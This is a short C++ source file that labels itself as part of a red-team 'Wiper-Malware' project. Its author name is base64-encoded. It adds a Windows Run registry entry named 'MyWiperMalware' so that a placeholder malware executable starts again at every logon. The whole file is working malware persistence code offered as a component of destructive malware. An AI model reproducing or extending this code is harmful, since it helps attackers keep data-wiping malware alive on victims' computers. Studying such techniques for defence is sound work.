/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <windows.h>
#include <iostream>

void addRegistryKey(const std::string& exePath) {
    HKEY hKey;
    LONG regOpen = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

    if (regOpen == ERROR_SUCCESS) {
        LONG regSet = RegSetValueEx(hKey, "MyWiperMalware", 0, REG_SZ, (BYTE*)exePath.c_str(), exePath.length() + 1);
        if (regSet == ERROR_SUCCESS) {
            std::cout << "Persistence added successfully.\n";
        }
        RegCloseKey(hKey);
    }
    else {
        std::cerr << "Failed to open registry key.\n";
    }
}

int main() {
    std::string exePath = "C:\\path\\to\\malware.exe";
    addRegistryKey(exePath);
    return 0;
}
